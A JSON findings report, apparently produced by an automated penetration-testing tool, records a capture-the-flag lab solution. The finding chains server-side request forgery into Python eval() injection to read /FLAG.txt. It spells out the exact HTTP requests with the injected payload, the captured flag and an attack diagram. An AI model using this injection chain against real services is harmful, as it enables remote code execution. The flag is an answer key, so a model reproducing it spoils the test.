@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:35:53.950233+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "1252b52d-565e-40ed-8e3b-6cb2641a710a",
+      "timestamp": "2026-04-12T21:35:53.950098+00:00",
+      "title": "Remote Code Execution via SSRF + Eval Injection (Multi-Service Chain)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:38029",
+      "description": "The flask_app container executes a multi-step chain that allows arbitrary Python eval() injection:\n1. /api/set?url= lets an attacker set any URL as the 'script source'\n2. The /names endpoint returns the raw stored name value\n3. flask_app fetches http://nginx/api/get to get the script URL, then fetches the script, then calls eval(json.loads(script)['script'])\n4. By setting name=JSON payload and api_url=http://nginx/names, the attacker controls what Python expression is evaluated\n\nAttack chain:\n- GET /name/set?name={\"script\":\"open('/FLAG.txt').read()\"}\n- GET /api/set?url=http://nginx/names\n- GET /app \u2192 flask_app fetches http://nginx/names (our JSON), evals open('/FLAG.txt').read()\n\nHint context: 'The developer was trying to make everything so secure that he ended up making it insecure' - the developer used nginx as a config store thinking it was secure, but the relationships between the name endpoint and the API URL endpoint created an exploit chain.",
+      "evidence": "Flag extracted from /FLAG.txt: flag{6a221da4-597c-4dea-98c2-4f2417dd77e7}\n\nHTTP request to trigger:\nGET /name/set?name={\"script\":\"open('/FLAG.txt').read()\"} HTTP/1.1\nHost: 172.17.0.1:38029\n\nGET /api/set?url=http://nginx/names HTTP/1.1\nHost: 172.17.0.1:38029\n\nGET /app HTTP/1.1\nHost: 172.17.0.1:38029\n\nResponse body: <div class=\"result\">flag{6a221da4-597c-4dea-98c2-4f2417dd77e7}</div>",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "1. GET http://172.17.0.1:38029/name/set?name={\"script\":\"open('/FLAG.txt').read()\"}\n2. GET http://172.17.0.1:38029/api/set?url=http://nginx/names\n3. GET http://172.17.0.1:38029/app",
+        "expected": "flag{6a221da4-597c-4dea-98c2-4f2417dd77e7} appears in response body"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "60d8e388-b5ef-45be-a7e7-11dbcf7a5ec3",
+      "timestamp": "2026-04-12T21:36:07.543390+00:00",
+      "title": "CTF Attack Architecture",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker\"] -->|\"name/set JSON payload\"| Nginx[\"Nginx :38029\"]\n  Attacker -->|\"api/set url=nginx/names\"| Nginx\n  Attacker -->|\"GET /app\"| Nginx\n  Nginx --> FlaskApp[\"flask_app :8080\"]\n  FlaskApp -->|\"GET nginx/api/get\"| Nginx\n  Nginx -->|\"returns nginx/names URL\"| FlaskApp\n  FlaskApp -->|\"GET nginx/names\"| Nginx\n  Nginx -->|\"returns JSON script payload\"| FlaskApp\n  FlaskApp -->|\"eval() on script field\"| RCE[\"RCE reads /FLAG.txt\"]\n  FlaskAPI[\"flask_api :8081\"] -->|\"normally /script endpoint\"| FlaskApp"
+    }
+  ]
+}
